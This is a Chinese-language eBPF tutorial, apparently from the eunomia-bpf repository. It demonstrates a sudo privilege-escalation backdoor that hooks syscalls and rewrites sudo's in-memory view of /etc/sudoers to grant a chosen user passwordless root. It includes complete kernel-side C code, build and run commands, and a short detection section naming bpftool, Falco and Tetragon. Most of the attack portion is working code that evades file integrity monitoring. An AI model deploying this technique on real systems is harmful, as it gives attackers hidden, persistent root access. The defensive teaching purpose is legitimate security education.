# eBPF 教程: 文件操纵实现 sudo 权限提升

eBPF 的能力远不止简单的跟踪——它可以实时修改流经内核的数据。虽然这种能力为性能优化和安全监控提供了创新解决方案,但它也为传统安全工具可能遗漏的复杂攻击向量打开了大门。本教程演示了其中一种技术:使用 eBPF 通过操纵 `sudo` 读取 `/etc/sudoers` 时看到的内容,向非特权用户授予 root 访问权限。

此示例揭示了攻击者如何滥用 eBPF 的 `bpf_probe_write_user` 辅助函数来完全绕过 Linux 的权限模型,而不会在日志文件中留下痕迹或修改实际的系统文件。理解这些攻击模式对于构建 eBPF 感知安全监控的防御者至关重要。

> 完整源代码: <https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/26-sudo>

## 攻击向量:拦截文件读取

传统的权限提升攻击直接修改 `/etc/sudoers`,在文件时间戳、审计日志和完整性监控系统中留下明显痕迹。这种基于 eBPF 的方法要微妙得多——它拦截 `sudo` 的读取操作,并在 `sudo` 处理之前替换内存中的文件内容。磁盘上的实际文件保持不变,击败了大多数文件完整性监视器。

攻击的工作原理是利用一个关键窗口:当 `sudo` 将 `/etc/sudoers` 读入缓冲区时,数据短暂地存在于用户空间内存中。eBPF 程序可以使用 `bpf_probe_write_user` 访问和修改此用户空间内存,有效地向 `sudo` 撒谎关于存在什么权限,而无需触摸真实文件。

以下是攻击流程:当任何进程打开 `/etc/sudoers` 时,我们记录其文件描述符。当同一进程从文件读取时,我们捕获缓冲区地址。读取完成后,我们用 `<username> ALL=(ALL:ALL) NOPASSWD:ALL #` 覆盖第一行,使 `sudo` 相信目标用户具有完全的 root 权限。尾部的 `#` 注释掉该行上的任何原始内容,防止解析错误。

## 实现:挂钩系统调用路径

让我们检查如何在 eBPF 中实现此攻击。完整的内核端代码协调四个系统调用挂钩来跟踪文件操作并注入恶意内容。

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// 环形缓冲区映射,用于从内核向用户传递消息
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// 保存来自 'openat' 调用的文件描述符的映射
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// 保存来自 'read' 调用的缓冲区地址的映射
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// 可选的目标父进程 PID
const volatile int target_ppid = 0;

// 用户的 UserID,如果我们要限制仅针对此用户运行
const volatile int uid = 0;

// 这些存储我们要添加到 /etc/sudoers 的字符串
// 当 sudo 查看时,这使它认为我们的用户可以无密码 sudo
const volatile int payload_len = 0;
const volatile char payload[max_payload_len];

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // 检查我们是否是感兴趣的进程线程
    // 如果 target_ppid 为 0,则我们针对所有 pid
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // 检查 comm 是否为 sudo
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const int sudo_len = 5;
    const char *sudo = "sudo";
    for (int i = 0; i < sudo_len; i++) {
        if (comm[i] != sudo[i]) {
            return 0;
        }
    }

    // 现在检查我们是否正在打开 sudoers
    const char *sudoers = "/etc/sudoers";
    char filename[sudoers_len];
    bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
    for (int i = 0; i < sudoers_len; i++) {
        if (filename[i] != sudoers[i]) {
            return 0;
        }
    }
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);

    // 如果按 UID 过滤,检查它
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // 为 sys_exit 调用将 pid_tgid 添加到映射
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // 将映射值设置为返回的文件描述符
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // 检查这是否是 sudoers 文件描述符
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // 从参数中存储缓冲区地址到映射
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // 记录并退出
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // 检查此 open 调用是否正在读取我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // 这是从 read 系统调用返回的数据量
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;

    // 添加我们的有效负载到第一行
    if (read_size < payload_len) {
        return 0;
    }

    // 覆盖第一块数据
    // 然后添加 '#' 来注释掉块中的其余数据。
    // 这有点破坏了 sudoers 文件,但一切仍然按预期工作
    char local_buff[max_payload_len] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) {
            local_buff[i] = '#';
        }
        else {
            local_buff[i] = payload[i];
        }
    }
    // 将数据写回缓冲区
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    // 发送事件
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // 检查我们是否是感兴趣的进程线程
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // 关闭文件,从所有映射中删除 fd 以清理
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}
```

程序使用多阶段方法。首先,`handle_openat_enter` 充当过滤器——它检查进程是否为 `sudo`,是否正在打开 `/etc/sudoers`,以及可选地是否匹配特定的 UID 或父 PID。此过滤至关重要,因为我们不想影响系统上的每个文件操作,只影响 `sudo` 读取其配置的特定情况。

当 `sudo` 打开 `/etc/sudoers` 时,内核返回一个文件描述符。我们在 `handle_openat_exit` 中捕获它并将文件描述符存储在 `map_fds` 中。此映射将进程(由 `pid_tgid` 标识)链接到其 sudoers 文件描述符,以便我们知道要拦截哪些读取。

下一个挂钩 `handle_read_enter` 在 `sudo` 对该文件描述符调用 `read()` 时触发。这里的关键细节是捕获缓冲区地址——那是内核将复制文件内容的地方,也是我们将覆盖的地方。我们将此地址存储在 `map_buff_addrs` 中。

攻击在 `handle_read_exit` 中执行。在内核完成读取操作并用真实的 sudoers 内容填充缓冲区后,我们使用 `bpf_probe_write_user` 覆盖它。我们用有效负载(`<username> ALL=(ALL:ALL) NOPASSWD:ALL #`)替换第一行,并用 `#` 字符填充缓冲区的其余部分以注释掉原始内容。从 `sudo` 的角度来看,它读取了一个合法的 sudoers 文件,授予我们的用户完全权限。

最后,`handle_close_exit` 在 `sudo` 关闭文件时清理我们的跟踪映射,防止内存泄漏。

## 用户空间加载器和配置

用户空间组件很简单——它配置攻击参数并加载 eBPF 程序。关键部分是设置将注入到 `sudo` 内存中的有效负载字符串。此字符串存储在 eBPF 程序的只读数据部分,使其在验证时对内核可见,但在加载前可修改。

加载器接受命令行参数来指定要授予权限的用户名,可选地将攻击限制为特定用户或进程树,然后使用这些参数烘焙到字节码中加载 eBPF 程序。当 `sudo` 接下来运行时,攻击会自动执行,无需进一步的用户空间交互。

## 安全影响和检测

此攻击演示了为什么 eBPF 需要 `CAP_BPF` 或 `CAP_SYS_ADMIN` 权限——这些程序可以从根本上改变系统行为。即使攻击者短暂地获得了 root 访问权限,也可以加载此 eBPF 程序并在其初始立足点被移除后维持持久访问。

检测具有挑战性。磁盘上的文件保持不变,因此传统的文件完整性监控失败。攻击完全发生在正常系统调用执行期间的内核空间中,不留下异常的进程行为。然而,防御者可以查找具有写入能力的已加载 eBPF 程序(`bpftool prog list`),监控 `bpf()` 系统调用,或使用可以检查已加载程序的 eBPF 感知安全工具。

像 Falco 和 Tetragon 这样的现代安全平台可以通过监控程序加载和检查附加的挂钩来检测可疑的 eBPF 活动。关键是保持对 eBPF 子系统本身的可见性。

## 编译和执行

通过在教程目录中运行 make 来编译程序:

```bash
cd src/26-sudo
make
```

要测试攻击(在安全的 VM 环境中),以 root 身份运行并指定目标用户名:

```bash
sudo ./sudoadd --username lowpriv-user
```

这将拦截 `sudo` 操作并授予 `lowpriv-user` root 访问权限,而不修改 `/etc/sudoers`。当 `lowpriv-user` 运行 `sudo` 时,他们将能够以 root 身份执行命令而无需输入密码。读取 `/etc/sudoers` 的其他程序(如 `cat` 或文本编辑器)仍将看到原始的、未修改的文件。

`--restrict` 标志将攻击限制为仅在由指定用户执行时工作,`--target-ppid` 可以将攻击范围限定为特定的进程树。

## 总结

本教程展示了 eBPF 的内存操纵能力如何通过拦截和修改流经内核的数据来颠覆 Linux 的安全模型。虽然对于合法的调试和监控非常强大,但这些相同的功能使得能够绕过传统安全控制的复杂攻击成为可能。防御者的关键要点是,eBPF 程序本身必须被视为攻击面的关键部分——监控加载了哪些 eBPF 程序以及它们使用什么能力对于现代 Linux 安全至关重要。

> 如果你想深入了解 eBPF,请查看我们的教程代码仓库 <https://github.com/eunomia-bpf/bpf-developer-tutorial> 或访问我们的网站 <https://eunomia.dev/tutorials/>。

## 参考资料

- 原始 bad-bpf 项目: <https://github.com/pathtofile/bad-bpf>
- eBPF 辅助函数文档: <https://man7.org/linux/man-pages/man7/bpf-helpers.7.html>
- `bpf_probe_write_user` 安全考虑: <https://lwn.net/Articles/695991/>
